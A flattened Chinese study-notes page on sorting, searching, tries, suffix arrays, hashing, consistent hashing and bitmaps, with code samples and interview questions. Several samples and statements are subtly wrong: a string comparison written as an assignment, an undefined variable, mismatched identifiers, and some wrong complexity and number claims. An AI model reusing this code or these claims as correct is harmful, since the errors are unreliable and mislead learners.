从二路到多路（k路），增大k可以减少外存信息读写时间，但k个归并段中选取最小的记录需要比较k-1次，为了降低选出每个记录需要的比较次数k，引出了“败者树”的概念。 败者树 是对树形选择排序的一种变形，可以视为一棵完全二叉树。每个叶结点存放各归并段在归并过程中当前参加比较的记录，内部结点用来记忆左右子树中的“失败者”，而让胜者往上继续进行比较，一直到根结点。如果比较两个数，大的为失败者、小的为胜利者，则根结点指向的数为最小数。 5.5 计数排序计数排序统计小于等于该元素值的元素的个数i，于是该元素就放在目标数组的索引i位（i≥0）。 计数排序基于一个假设，待排序数列的所有数均为整数，且出现在（0，k）的区间之内。 如果 k（待排数组的最大值） 过大则会引起较大的空间复杂度，不适合数范围大的情况，一般是用来排序 0 到 100 之间的数字的最好的算法（比如考试分数排名），但是它不适合按字母顺序排序人名。 计数排序不是比较排序，排序的速度快于任何比较排序算法。 计数排序是稳定的排序算法。 算法思想： 找出待排序的数组中最大元素； 统计数组中每个值为 i 的元素出现的次数，存入数组 C 的第 i 项； 向填充目标数组：将每个元素 i 填充进新数组，填充次数为 C[i] ； 123456789101112131415161718192021222324252627282930313233343536void CountSort(vector&lt;int&gt;&amp; vecRaw, vector&lt;int&gt;&amp; vecObj)&#123; // 若待排序容器为空 if (vecRaw.size() == 0) return; // 使用 vecRaw 的最大值 + 1 作为计数容器 countVec 的大小 // max_element用于查询容器中最大值第一次出现的位置 int vecCountLength = (*max_element(begin(vecRaw), end(vecRaw))) + 1; vector&lt;int&gt; vecCount(vecCountLength, 0); // 用于记录所有元素的出现次数 // 统计每个键值出现的次数 for (int i = 0; i &lt; vecRaw.size(); i++) vecCount[vecRaw[i]]++; // 后面的键值出现的位置为前面所有键值出现的次数之和 for (int i = 1; i &lt; vecCountLength; i++) vecCount[i] += vecCount[i-1]; // 将键值放到目标位置 for (int i = vecRaw.size(); i &gt; 0; i--) // 此处逆序是为了保持相同键值的稳定性 vecObj[--vecCount[vecRaw[i-1]]] = vecRaw[i-1];&#125;int main()&#123; vector&lt;int&gt; vecRaw = &#123; 0,5,7,9,6,3,4,5,2,8,6,9,2,1 &#125;; vector&lt;int&gt; vecObj(vecRaw.size(), 0); CountSort(vecRaw, vecObj); for (int i = 0; i &lt; vecObj.size(); ++i) cout &lt;&lt; vecObj[i] &lt;&lt; &quot; &quot;; cout &lt;&lt; endl; return 0;&#125; 稳定性：稳定。 缺点：空间浪费。其需要长度为最大值的计数空间，但是其间的很多数值可能并未出现。 优化：使用长度为最大值-最小值+1的计数空间。 &#x3D;&#x3D;5.5 桶排序&#x3D;&#x3D;（重要）桶排序 (Bucket sort)是计数排序的升级版。它利用了函数的映射关系，高效与否的关键就在于这个映射函数的确定。 参考：https://www.bilibili.com/video/BV1Ur4y1w7tv 工作原理： 假设输入数据服从均匀分布，将数据分到有限数量的桶里，每个桶再分别排序（有可能再使用别的排序算法或是以递归方式继续使用桶排序进行排序）。 设置一个定量的数组当作空桶子。 寻访序列，并且把项目一个一个放到对应的桶子去（比如一位数放到一个桶、两位数放到一个桶、三位数放到一个桶）。 对每个不是空的桶子进行排序（递归或者使用其他排序算法）。 从不是空的桶子里把项目再放回原来的序列中，合并。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960public class BucketSort implements IArraySort &#123; private static final InsertSort insertSort = new InsertSort(); @Override public int[] sort(int[] sourceArray) throws Exception &#123; // 对 arr 进行拷贝，不改变参数内容 int[] arr = Arrays.copyOf(sourceArray, sourceArray.length); return bucketSort(arr, 5); &#125; private int[] bucketSort(int[] arr, int bucketSize) throws Exception &#123; if (arr.length == 0) &#123; return arr; &#125; int minValue = arr[0]; int maxValue = arr[0]; for (int value : arr) &#123; if (value &lt; minValue) &#123; minValue = value; &#125; else if (value &gt; maxValue) &#123; maxValue = value; &#125; &#125; int bucketCount = (int) Math.floor((maxValue - minValue) / bucketSize) + 1; int[][] buckets = new int[bucketCount][0]; // 利用映射函数将数据分配到各个桶中 for (int i = 0; i &lt; arr.length; i++) &#123; int index = (int) Math.floor((arr[i] - minValue) / bucketSize); buckets[index] = arrAppend(buckets[index], arr[i]); &#125; int arrIndex = 0; for (int[] bucket : buckets) &#123; if (bucket.length &lt;= 0) &#123; continue; &#125; // 对每个桶进行排序，这里使用了插入排序 bucket = insertSort.sort(bucket); for (int value : bucket) &#123; arr[arrIndex++] = value; &#125; &#125; return arr; &#125; /** * 自动扩容，并保存数据 * * @param arr * @param value */ private int[] arrAppend(int[] arr, int value) &#123; arr = Arrays.copyOf(arr, arr.length + 1); arr[arr.length - 1] = value; return arr; &#125;&#125; 由于桶中将要存放多少元素是不确定的，因此最好将桶定义为链表数据结构。 复杂度 桶排序的时间复杂度取决与对各个桶之间数据进行排序的时间复杂度，因为其它部分的时间复杂度都为O(n)。很显然,桶划分的越小，各个桶之间的数据越少，排序所用的时间也会越少，但相应的空间消耗就会增大。 5.5 基数排序（重要）基数排序是桶排序的扩展，是按照低位先排序，然后收集；再按照高位排序，然后再收集；依次类推，直到最高位。有时候有些属性是有优先级顺序的，先按低优先级排序，再按高优先级排序。最后的次序就是高优先级高的在前，高优先级相同的低优先级高的在前。 算法描述： 取得数组中的最大数，并取得位数； arr为原始数组，从最低位开始取每个位组成radix数组； 对radix进行计数排序（利用计数排序适用于小范围数的特点）； 按个位数分配桶： 然后依次从桶中收集元素，同一桶中的元素，先进桶的在前，此序列的个位数是有序的： 接着，按照第一次收集的序列顺序，再依次入桶，这次按十位数分配桶： 然后依次从桶中收集元素，同一桶中的元素，先进桶的在前，此序列的十位个位组成的数是有序的： 接着，按照第二次收集的序列顺序，再依次入桶，这次按百位数分配桶： 然后依次从桶中收集元素，同一桶中的元素，先进桶的在前，此序列的个十百位组成的数都是有序的： 12345678910111213141516171819202122232425def radix(arr): digit = 0 max_digit = 1 max_value = max(arr) #找出列表中最大的位数 while 10**max_digit &lt; max_value: max_digit = max_digit + 1 while digit &lt; max_digit: temp = [[] for i in range(10)] for i in arr: #求出每一个元素的个、十、百位的值 t = int((i/10**digit)%10) temp[t].append(i) coll = [] for bucket in temp: for i in bucket: coll.append(i) arr = coll digit = digit + 1 return arr 稳定性：稳定。 5.6 不同排序算法的比较 稳定性 所有简单排序(时间复杂度为0(n)都是**稳定排序，选择排序除外**； 所有时间复杂度为$O(nlog_2n)$的排序都是不稳定排序，归并排序、基数排序除外。希尔排序是不稳定排序，基数排序是稳定排序。 时间复杂度（比较次数） 比较次数与初始排列无关的是选择排序（简单选择排序、堆排序）。 在初始序列基本有序 的情况下，最优的是插入排序 ，此时插入排序时间复杂度为O(n)，其次是冒泡排序，时间复杂度也为O(n)， 快速排序在此时性能最差，时间复杂度为$O(n^2)$。同时，快速排序在初始序列逆序的时候，性能也最差，此时时间复杂度也为$O(n^2)$。 堆排序对初始数据集的排列顺序不敏感，在最好、最坏和平均情况下，堆排序的时间复杂度均为$O(nlog_2n)$。 空间复杂度 基于比较的排序算法中（插入排序、交换排序、选择排序、归并排序），归并排序的空间复杂度最高，为$O(n)$，其次为快速排序，为$O(logn)$，其余的为$O(1)$。 6 查找6.1 基本概念查找结构（查找表）：用于查找的数据集合称为查找结构（查找表），它可以是一个链表，也可以是一个数组或其他数据类型。对于查找表经常进行的操作一般有四种： 查询 某个特定的数据元素是否在查找表中； 检索 满足条件的某个特定的数据元素的各种属性； 在查找表中 插入 一个数据元素； 从查找表中 删除 某个数据元素。 如果一个查找表的操作只涉及1和2的操作，则无须动态地修改查找表，此类查找表称为静态查找表。与此对应，需要动态地修改的查找表则称为动态查找表。 适合静态查找表的查找方法有：顺序查找、折半查找、散列查找等；适合动态查找表的查找方法有二叉排序树的查找、散列查找等。 平均查找长度：在查找的过程中，一次查找的长度是指需要比较的关键码次数，而平均查找长度则是所有查找过程中进行的关键码比较次数的平均值，其定义如下：$$ASL&#x3D;\\sum_{i&#x3D;1}^np_ic_i$$式中，$p_i$为查找第i个元素的概率，一般认为每个元素的查找概率相等；$c_i$为找到第i个元素所需的比较次数。平均查找次数ASL是衡量查找算法效率的最主要指标。 例1：查找一个整数数组中第二大的数。（2012，迅雷） 12345678910111213141516const int minNum = -32767; // int型最小值int find_sec_max(int data[], int count) &#123; int maxnumber=data[0]; int sec_max = minNum; for(int i=1;i &lt; count; i++) &#123; if(data[i] &gt; maxnumber) &#123; sec_max = maxnumber; // 原来的最大值变成第二大 maxnumber = data[i]; &#125; else &#123; if (data[i] &gt; sec_max) sec_max = data[i]; // 原来的第二大值被换下 &#125; &#125; return sec_max;&#125; 6.2 折半查找折半查找又称为 二分查找，仅适用于事先已经排好序的顺序表。 基本思路 首先将给定值K与表中中间位置元素的关键字比较，若相等，则查找成功，返回该元素的存储位置；若不等，则所需查找的元素只能在中间数据以外的前半部分或后半部分中。然后在缩小的范围中继续进行同样的查找，如此重复直到找到为止。算法如下： 123456789101112131415int BinSearch (RecType R[], int n, KeyType k) &#123;//在有序表R中查找关键字为key的元素，若存在则返回其位置，不存在则返回-1 int low=0, high=n-1, mid; while (low &lt;= high) &#123; // 有序表存在元素时循环 mid= (low+high)/2; //取中间位置 if (R[mid].key == k) // 查找成功，返回其逻辑序号mid+1 return mid+1; if (R[mid].key &gt; k) // 在前半部分继续查找 high = mid-1; else low = mid+1 ; // 在后半部分继续查找 &#125; return -1;&#125; 因为折半查找需要方便地定位查找区域，所以适合折半查找的存储结构必须具有随机存取的特性。因此，二分查找法仅适合于线性表的顺序存储结构，不适合链式存储结构，且要求元素按关键字有序排列。 例1：有一个循环有序数组A，如{7, 8, 9, 0, 1, 2, 3, 4, 5, 6}，不知道其最小值的位置。那么如何从这样的数组中寻找一个特定的元素呢? （2012，百度，2012，人民搜索） 解答：可以将这个循环有序数组看作两个有序子数组，前一个子数组的元素均大于后一个数组。在二分查找的过程中，增加一个判断，确定中间元素位于哪一个子数组。 12345678910111213141516171819202122232425/*lower为数组首元素下标high为数组最后的元素下标，但由于是循环有序，所以R[high]并不是最大值k为要查找的值*/int search(int R[], int lower, int high, int k) &#123; while (lower &lt;= high) &#123; int mid = (lower+high)/2; if (R[mid] == k) // 查找成功，返回其逻辑序号mid+1 return mid+1; else // lower到mid是有序的，mid到high跨了两个子数组 if (R[lower] &lt;= R[mid])&#123; if(k &gt; R[mid]) // k大于mid lower = m+1; else if (k &gt;= R[lower]) high = mid-1; // k在lower和mid之间 else lower = mid+1; // k 比 lower 和 mid 均要小，所查找元素在mid之后 &#125; // lower到mid跨了两个子数组，mid到high是有序的 else if (k &lt; R[mid]) high = mid-1; // k在lower和mid之间 else if (k &lt;= R[high]) lower = mid+1; // k在mid+1和high之间 else high = mid-1; // k 比 mid 和 high 均要大，所查找元素在mid之前 &#125; return -1;&#125; 上述算法对数组元素重复的时候不支持，比如{2, 2, 3, 2, 2}，此时只能依次遍历。 判定树 折半查找的过程可用图16-1所示的二叉树来描述，称为 判定树。树中每个圆形结点表示一个记录，结点中的值为该记录的关键字值；树中最下面的叶结点都是方形的，它表示查找不成功的情况。从判定树可以看出，查找成功时的查找长度为从根结点到目的结点的路径上的结点数，而查找不成功时的查找长度为从根结点到对应失败结点的父结点路径上的结点数；每个结点值（mid）均大于其左子结点值（low），且均小于其右子结点值（high）。若有序序列有n个元素，则对应的判定树有n个圆形的非叶结点和n+1个方形的叶结点。 图16-1中，n个圆形结点（代表有序序列有n个元素）构成的树的深度与n个结点的完全二叉树的深度(高度)相等，均为$\\lfloor log_2N \\rfloor +1$ 或者 $\\lceil log_2(N+1) \\rceil \\space$。 折半查找的时间复杂度为$O(log_2N)$ ，最坏的情况下查找次数也不会超过为$\\lfloor log_2N \\rfloor +1$ ，不管有没有查找成功。比顺序查找的效率高。 在图16-1所示的判定树中，在等概率的情况下，查找成功的ASL&#x3D;(1x1+2x2+3x4+4x4)&#x2F;11&#x3D;3（每个结点的深度为其查找长度，深度为1的结点有1个，深度为2的结点有2个，深度为3的结点有4个，深度为4的结点有4个），查找不成功的ASL&#x3D;(3x4+4x8)&#x2F;12&#x3D;11&#x2F;3。 由上述的分析可知，用折半查找法查找到给定值或查找失败的比较次数最多不会超过树的高度，如在图16-1中，查找成功与查找不成功，最坏的情况下，都需要比较4次（$\\lfloor log_2N \\rfloor +1$ ，即树高）。 例5：有一类数组，例如{1,2, 3, 4, 6, 8, 9, 4, 8, 11, 18, 19, 100}，前半部分是一个递增数组，后半部分还是递增数组，但整个数组不是递增数组，怎么最快地找出其中一个数(有大量查询待进行) ?(2011●百度) 解答：开始时找出两个数组的分界线，有两个，一个是前一个数组的最末元素，另一个是后一个数组的最初元素，分别设为preMax和aftMin。 然后处理每个查询，查询过程为: 分析要查找的数，若此数刚好等于preMax或aftMin，则返回相应位置; 否则，若此数小于preMax，则在前一个数组二分查找； 若此数大于aftMin，则也在后一个数组二分查找； 若此数大于preMax且小于aftMin，则不存在。 6.3 键树键树的定义与Trie树键树又称为数字查找树（Digital Search Trees）。 键树其结构受启发于一部大型字典的“书边标目”。字典中标出首字母是A, B, C, …, Z的单词所在页，再对各部分标出第二字母为A, B, C, …, Z的单词所在的页等。 它是一棵度大于等于2的树，树中的每个结点中不是包含一个或几个关键字， 而是只含有组成关键字的符号。例如，若关键字是数值，则结点中只包含一个数位：若关键字是单词，则结点中只包含一个字母字符。 假设有如下16个关键字的集合：{CAI、CAO、LI、LAN、CHA、CHANG、WEN、CHAO、YUN、YANG、LONG、WANG、ZHAO、LIU、WU、CHEN}。可对此集合作如下的逐层分割，首先按首字母分成不同子集，然后再在子集中按第二个字符进行分割….直到每个小子集中只包含一个关键字为止。如图16-2所示。 从根到叶子结点路径中结点的字符组成的字符串表示一个关键字， 叶子结点中的特殊符号S表示字符串的结束。 键树的存储通常有两种方式： 用树的孩子兄弟链表来表示键树（称为双链树） 每个Node有三个域： symbol域：存储关键字的一个字符； son域：存储指向第一棵子树的根的指针； brother域：存储指向右兄弟的指针。 这时的键树又称为双链树。图16-2所示键树的双链树如图16-3所示。 查找过程是，从根结点出发，顺着son查找，如果相等，继续下一个son。否则沿着brother查找。直到到了空指针为止。此时若仍未完成key的匹配，查找不成功。 在双链树中插入或删除一个关键字，相当于在树中某个结点上插入或删除一棵子树。 用多重链表表示（又称为Trie树，字典树） 如果以树的多重链表表示键树，则树的每个结点中应包含d个（d 为关键字符的基，如：字符集由英文大写字母构成时，则d&#x3D;26）指针域，此时的键树又称为Trie树。 Trie树的思想是利用字符串的公共前缀来降低时空开销。 由hello、her、hi、how、see、so组成的Trie树如下： Trie树的典型应用是用于统计和排序大量的字符串（但不仅限于字符串），比较适合的是查找前缀匹配的字符串，所以经常被搜索引擎系统用于文本词频统计。 Trie树的优点是最大限度地减少无谓的字符串比较。 Trie树的缺点是如果存在大量字符串且这些字符串基本没有公共前缀，则相应的Trie树将非常消耗内存。 **构建Trie树时间复杂度是 O(n)*（n是Trie树中所有元素的个数，即单词的个数单词的平均长度） **查询Trie树时间复杂度是 O(k)**（k 表示要查找的字符串的长度，即单词的平均长度） 例1：已知n个由小写字母构成的平均长度为10的单词，判断其中是否存在某个串为另一个串的前缀子串。 解答：使用Trie树。假设要查询的单词是abc，显然以b, c, d…等不是以a开头的字符串就不用查找了。首先建立一棵Trie树，然后将每个单词插入Trie树，时间复杂度为O(n*len)，其中len为单词的平均长度10，然后依次查询每个单词，每个单词查询的时间复杂度为单词的长度。查询时看是否存在有单词与已有单词结点重合即可。 例2：给定一个单词 a，如果通过交换单词中字母的顺序可以得到另外的单词b，那么定义b是a的兄弟单词，例如单词army和mary互为兄弟单词。现在给定一个字典，用户输入一个单词，如何根据字典找出这个单词有哪些兄弟单词?要求时间和空间效率尽可能高。(2012. 百度) 解法一：使用hash_map和链表。 首先使兄弟单词具有相同的id，比如army和mary具有相同的id为amry（相当于对单词的字母进行排序）。然后使用hash_map，生成id到链表的映射，链表用来存储id所对应所有兄弟单词。开始时，先遍历字典，将每个单词按照其id加入hash_map对应的链表中去。当需要查找某一单词的兄弟单词时，只需计算其id，然后根据hash_map找到id所对应的链表，这样就可以确定其兄弟单词。其中，创建hash_map的时间复杂度为$O(n)$，查找兄弟单词的时间复杂度为$O(1)$。 解法二：也是使用hash_map和链表。（此方法无需对单词的字母进行排序来生成id） 将每个字母对应一个 质数，这样单词就可以对应为其字母的质数之积。将得到的值进行hash，这样兄弟单词就具有相同的hash值。将hash值与其对应的所有兄弟单词组成的链表进行hash_map映射，key单词的乘积，value为链表起始地址。当需要查找某一单词的兄弟单词时，只需计算其单词乘积，然后查找hash_map，遍历链表就能得到所有兄弟单词。其中，创建hash_map的时间复杂度为$O(n)$，查找兄弟单词的时间复杂度为$O(1)$。 解法三：利用Trie树。 单词插入Trie树之前，先按照字母排序，如army与mary排完序都是amry。然后将amry插入Trie树，在Trie树的结点中增加一个vector，记录所有的兄弟单词。这样查询的时候，只需先将查询词排序，然后把排序后的单词拿去查询，当所有字母都遍历后，读出对应结点的vector，里面存储的即是此单词的所有兄弟单词。 键树的两种实现的对比双链树和Trie树是键树的两种不同表示方法，它们有各自的特点。 从其不同的存储结构特性可见，若键树中结点的度较大，则采用Trie树结构较双链树更为合适。 综上，键树的查找过程都是从根结点出发，走了一条从根到叶子( 或非终端结点)的路径，其查找时间依赖于单词的长度。 6.4 后缀树与后缀数组后缀树键树只适合前缀匹配和全字匹配，而后缀树（Sufix Tree）适合后缀和子串匹配。它与键树的最大不同在于，后缀树的单词集合是由指定字符串的后缀子串构成的。 比如字符串“minimize” 的后缀子串分别如下：minimize, inimize, nimize, imize, mize, ize, ze， e然后对这些子串的集合建立一棵键树， 即为“minimize”的后缀树。若字符串s为BIBS，则其建立的后缀树如图16-4所示。含有所有的后缀子串BIBS、IBS、BS、S。 后缀树常用于在串s中查询子串P是否存在。 **查询效率为O(n)**，n为单词长度。 后缀树还可以用来找出字符串S的最长重复子串S1、找出字符串S1和S2的最长公共子串、找出字符串s的最长回文子串S1等。 后缀数组后缀树实现较为复杂，通常可以用其变形后缀数组代替，使用数组来存储所有的后缀子串。 比如，若输入字符串为”banana”，该数组将表示这些后缀: a[0]：banana a[1]：anana a[2]：nana a[3]：ana a[4]：na a[5]：a 可见，由于数组a中的指针分别指向字符串中的每个后缀，所以将数组a命名为”后缀数组”。 找出字符串S的最长重复子串S1，比如abcdabcd的最长重复子串是abcd，abcdabcda的最长重复子串是abcda，最长重复子串可以重叠。 解法一：直接遍历。时间复杂度为$O(n^3)$。 123456789101112131415int comlen(char *p, char *q) &#123; // 返回p、q数组的最大公共长度 int i=0; while(*p &amp;&amp; (*p++ = *q++)) ++i; return i;&#125;// 逐个遍历所有的子串for(i=0 ;i&lt;n;++i) &#123; for(j=i+1 ;j&lt;n;++j)&#123; if ((thislen = comlen(&amp;c[i]，&amp;c[j])) &gt; maxlen) &#123; maxlen = thislen; maxi = i; maxj = j; &#125; &#125;&#125; 解法二：使用后缀数组 生成后缀数组，然后对后缀数组进行快速排序，将后缀相近的子串集中在一一起。比如输入字符串为”banana”，则排序后的后缀数组如下: a[0]：a a[1]：ana a[2]：anana a[3]：banana a[4]：na a[5]：nana 然后通过比较邻接元素，找出最长的重复字符串。 123456789101112131415161718192021222324252627282930313233#define MAXCHAR 5000 //最长处理5000个字符char C[MAXCHAR], *a [MAXCHAR]; // c存储字符串，a为指针数组，存储c的所有后缀子串int comlen(char *p, char *q) &#123; // 返回起始地址为p、q的数组的最大公共长度 int i=0; while(*p &amp;&amp; (*p++ = *q++)) ++i; return i;&#125;int pstrcmp (const void *p1, const void *p2) &#123; return strcmp (*(char**)p1, *(char**)p2); // 应用于库函数快排qsort的比较函数&#125;void main() &#123; char ch; int n=0, i, temp, maxlen=0, maxi=0; printf (&quot;Please input your string:\\n&quot;); n=0; while( (ch=getchar())!=&#x27;\\n&#x27;)&#123; a[n] = &amp;c[n]; C[n++]=ch; &#125; c[n]=&#x27;\\0&#x27;; //将数组c中的最后一个元素设为空字符，以终止所有字符串 qsort(a, n, sizeof(char*), pstrcmp); for(i=0; i&lt; n-1; ++i) &#123; temp = comlen(a[i], a[i+1]); if (temp &gt; maxlen) &#123; maxlen = temp; maxi = i; &#125; &#125; printf(&quot;%.*s\\n&quot;, maxlen, a [maxi]);&#125; 时间复杂度分析：处理过程为先对一个字符串生成相应的后缀数组，然后再排序，排完序依次检测相邻的两个字符串的开头公共部分，其中生成后缀数组时间复杂度为$O(n)$，排序时间复杂度为$O(nlognn)$，依次检测相邻的两个字符串时间复杂度为$O(n^2)$，故总的时间复杂度是$O(n^2logn)$，优于第一种方法的$O(n)$。 6.5 哈希表(重点)基本概念哈希表，也叫散列表，它是基于快速存取的角度设计的，是一种典型的“空间换时间”的做法。哈希表是普通数组的一种推广，因为数组可以直接寻址，故可在$O(1)$时间内访问数组的任意元素。 哈希表是根据关键字(Key value)而直接进行访问的数据结构。它将关键字通过某种规则映射到数组中某个位置，以加快查找的速度。这个映射规则称为哈希函数（散列函数），存放记录的数组称为 哈希表。哈希表建立了关键字和存储地址之间的一种直接映射关系。 若多个不同的关键字通过哈希函数计算得到相同的数组下标，称其发生了 冲突（碰撞），这些发生冲突的不同关键字称为 同义词。一方面，设计好的Hash函数应尽量减少这样的冲突；另一方面，由于这样的冲突总是不可避免的，所以还要设计好处理冲突的方法。 hash函数如果两个散列值是不相同的(根据同一函数)，那么这两个散列值的原始输入也是不相同的。这个特性使散列函数具有确定性的结果，具有这种性质的散列函数称为 单向散列函数。 典型的散列函数都有无限定义域，比如任意长度的字节字符串，和有限的值域，比如固定长度的比特串。 典型的哈希算法包括MD4、MD5和SHA-1，MD5和SHA-1 (安全哈希算法)可以说是目前应用最广泛的Hash算法，而它们都是以MD4为基础设计的。 MD4 MD是Message Digest的缩写。MD4的摘要长度为128位比特，可以用来表示32位的十六进制数字，适用于32位字长的处理器。 MD5 MD5是一种面向工业标准的hash方案，摘要长度为128位比特。MD5比MD4要复杂，所以速度也更慢一些，但是更安全，在抗分析和抗差分方面表现更好。 SHA-1 SHA-1是由美国国家安全局(NSA)设计，美国国家标准与技术研究院(NIST)发布的密码散列函数，SHA-1会从一个最大$2^{64}$位元的信息中产生一串160位元的摘要，SHA-1设计时基于和MD4相同原理，并且模仿了该算法。 hash函数的应用包括：文件校验、数字签名、鉴权协议。hash函数不能用来加密。 处理冲突（碰撞）的方法任何哈希函数都不可能绝对地避免冲突，为此必须考虑冲突发生时应如何进行处理，即为产生冲突的关键字寻找下一个“空”的Hash地址，于是提出了处理冲突的各种方法。 链地址法（hash值对应一个链表，存放多个记录） 链地址法是指把所有的冲突关键字（同义词）存储在一个线性链表中，这个链表由其散列地址唯一标识。 开放定址法（在冲突hash值基础上增量） 开放定址法是指可存放新表项的空闲地址，既向它的同义词表项开放，又向它的非同义词表项开放。一个地址往后的空间按照增量大小依次存放多个hash值。其数学递推公式为（$H_i$表示冲突发生后第$i$次探测的散列地址）：$$H_i&#x3D;(H(key)+d_i)%m$$式中，$i&#x3D;1, 2, …, k (k&lt;&#x3D;m-1)$，m为散列表表长，$d_i$为增量序列，$d_i$通常有以下几种取法： 当$d&#x3D;1, 2, …, m-1$时，称为线性探测法。其特点是，冲突发生时顺序查看表中下一个单元，直到找出一个空单元或查遍全表。 当$d&#x3D;1^2, -1^2, 2^2, -2^2,…,k^2, -k^2$时，其中k&lt;&#x3D;m&#x2F;2，又为二次探测法。 当$d_i$&#x3D;伪随机数序列时，称为伪随机探测法。 在开放定址的情形下，不能随便删除表中已有元素，因为若删除元素将会截断其他具有相同散列地址的元素的查找地址。所以若想删除一个元素时， 给它做一 个删除标记，进行逻辑删除。但这样做的副作用是，在执行多次删除后，表面上看起来散列表很满，实际上只是逻辑删除，物理上有许多位置没有利用，因此需要定期维护散列表，要把做删除标记的元素物理删除。 再散列法 当发生冲突时，利用另一个哈希函数再次计算一个地址，直到冲突不再发生，这种方法称为再哈希法。 建立一个公共溢出区 一旦由哈希函数得到的地址冲突，就都填入溢出表。 进行hash表的查找时，计算查找成功的平均查找长度ASL时，平均的概念是对表中当前非空元素而言的，并非是整个表长。计算查找失败的平均查找长度ASL时，平均的概念是针对表长。 6.6 一致性哈希如何快速定位数据在集群中的存储位置，关系到集群的性能。 普通集群普通集群把固定的key映射到固定的结点上，结点只存放各自key的数据，如图16-5所示。 此种方法将key和结点的关系作为一张单独的表格进行维护，当其中一个结点宕机， 结点上的数据需要迁移，此表格也要重新维护。此种方法的问题是，当需要查找某个key值对应的数据时，必须遍历所有表格，直到寻找到存放此key值的结点，然后再去对应结点读取数据，可见查找速度慢。 hash集群为了不想维护上节所述的表格，降低复杂性和其他开销，容易想到对数据的key（假设key为整型，如果不是整型，可通过一个哈希函数映射为一个整型）进行哈希（对结点数取模）。 比如我们原本有四个结点，如图16-6所示。图16-6中，nodeA、 node B等为服务器（结点），key1、key2等为数据的key。可见寻找数据时，只需将key值对结点数取模，然后再去访问对应结点即可。 此种方法的不足是：假如某个时候其中一个结点宕机了，那这个结点的数据就完全不可用了。如要进行数据迁移的话，因为这时候结点少了，变为3，对key重新模3的话，只能整个集群的数据都重新映射一遍才能达到效果。 一致性哈希一致性哈希是一种哈希算法，在移除或添加一个结点时，它能够尽可能小地改变已存在key的映射关系。 一致性哈希将整个哈希值空间组织成一个虚拟的圆环，现假设某哈希函数Hash的值空间为0~$2^{32}$-1（即哈希值是一一个32位无符号整型），那么整个哈希空间环如图16-7所示。 基本思想：使用相同的哈希算法（即假设的哈希函数Hash）将数据和结点都映射到上图的环形哈希空间中。 把数据映射到Hash空间 假设有4个数据object1~object4，那么通过哈希函数计算出的哈希值key在环上的分布如图16-8所示。 把结点映射到哈希空间 具体可以选择结点服务器的IP或主机名作为关键字进行哈希，这样每台机器就能确定其在哈希环上的位置。 假设当前有A, B和C共3台服务器(结点)，那么其映射结果将如图16-9所示，它们在哈希空间中以对应的哈希值排列。 把数据映射到结点 现在结点和数据都已经通过同一个哈希算法Hash映射到哈希数值空间中了，接下来要考虑的就是如何将数据映射到结点上（确定了映射关系，也就确定了存储关系）。在这个环形空间中，如果沿着顺时针方向（当然也可以约定为逆时针）从数据的key值出发，直到遇见一个结点机器，那么就将该数据存储在这个结点上，因为数据和结点的哈希值是固定的，因此这个结点必然是唯一和确定的。这样就确定了一种数据和结点的一对一映射方法。如图16-10所示。 移除结点 考虑假如node B出现问题，根据上面讲到的映射方法，这时受影响的将仅是那些沿node B逆时针遍历直到下一个node (本例为nodeA)之间的数据，即本来映射到node B上的那些数据。 因此这里仅需要变动数据object4，将其重新映射到nodeC上即可，如图16-11所示。 添加结点 考虑已有nodeA、B、C的情况下，再添加一台新的node D的情况。假设在这个环形哈希空间中，node D被映射在数据object2和object3之间。这时受影响的将仅是那些沿node D逆时针遍历直到下一个node (本例是node B)之间的数据(它们本来是映射到node C)，将这些数据重新映射到node D上即可。因此这里仅需要变动数据object2,将其重新映射到nodeD上，如图16-12所示。 虚拟结点 在上面的例子中，假设仅部署node A和nodeC，那么在4个数据中，node A仅存储了object1，而node C则存储了objec2、object3 和object4，可见分布是很不平衡的。为了解决这种情况，一致性哈希引入了 “虚拟结点”的概念。 “虚拟结点”(Virtual Node)是实际结点在哈希空间的复制品，一个实际结点对应了若干“虚拟结点”，这个对应个数也称为“复制个数”，“虚拟结点”在哈希空间中以哈希值排列。 仍以仅部署node A和node C的情况为例，现在我们引入虚拟结点，并设置“复制个数”为2，这就意味着一共会存在4个“虚拟结点”，node A1, node A2代表了node A；node C1，node C2代表了nodeC。假设一种比较理想的情况，参见图16-13。 此时，数据object1和objec2被映射到了nodeA上，而objec3和object4映射到了nodeC上。平衡性有了很大提高。 6.7 海量数据处理所谓海量数据处理，就是基于海量数据的查找、统计、运算等操作。所谓海量数据，就是数据量太大，所以导致要么是无法在较短时间内迅速解决，要么是数据太大导致无法一次性装入内存。从而导致传统的操作无法实现。 分治——hash映射所有散列函数都有抗碰撞性：如果两个散列值是不相同的(根据同一函数)，那么这两个散列值的原始输入也是不相同的。这个特性使散列函数具有确定性的结果。 在对大文件进行处理时，若文件过大，无法一次性读入内存，可以考虑采取Hash映射的方法将文件中的元素映射到不同小文件中，然后再依次处理各个小文件，最后合并处理结果，这样就降低了问题规模。 top K 问题 在大规模数据处理中，经常会遇到的一类问题：如何寻找出最大的前K个数、或最小的K个数。 若这些数据能一次性读入内存，快排一次排序是时间复杂度为O(n)的解决办法； 但当面对着海量数据时，快排的一次划分就不能再使用。但依然可以使用堆（求最大K个数采用小根堆，求最小K个数采用大根堆），时间复杂度为O(nlogk)，空间复杂度为0(1)。故堆也是海量数据处理经常采用的工具。 对单词hash后取余，按余数将文件内的单词分散到多个文件，每个文件大小不超过内存限制。然后按照分治法的思想，在每个小文件内对单词进行频率统计（trie树或者hash_map），然后对每个文件的频率前100的单词进行归并排序。 Bit-mapBit-map的原理就是使用位数组来表示某些元素是否存在，一个元素对应一位，由于采用了bit 为单位来存储数据，因此在存储空间方面，可以大大节省，故适用于海量数据的快速查找、判重、删除等。 假设我们要对值区间为0~7的5个元素(4, 7, 2, 5, 3) 排序(这里假设这些元素没有重复)。那么我们就可以采用Bit-map的方法来达到排序的目的。要表示8个数，我们就只需要8个bit (1Bytes)，首先我们开辟1Byte的空间，bit位依次编号为01234567，将这些空间的所有bit位都置为0，得到00000000。然后遍历待排序表，将元素值所对应的bit位置1，得到00111101。最后依次输出该位为1的编号即可：2, 3, 4, 5, 7。 位图排序的时间复杂度是O(n)，它是以空间换时间（需要一个n位的串）。 在程序设计中，经常需要判断集合中是否存在重复的问题，当数据量比较大时，位图法比较适合。 例2：已知某个文件内包含一些电话号码， 每个号码为8位数字，统计不同号码的个数。 解答：8位数字表示的最大数为99999，可以理解为从0~99999999的数字，一共10的8次方个数字。用bit-map解决，则每个数字对应一个 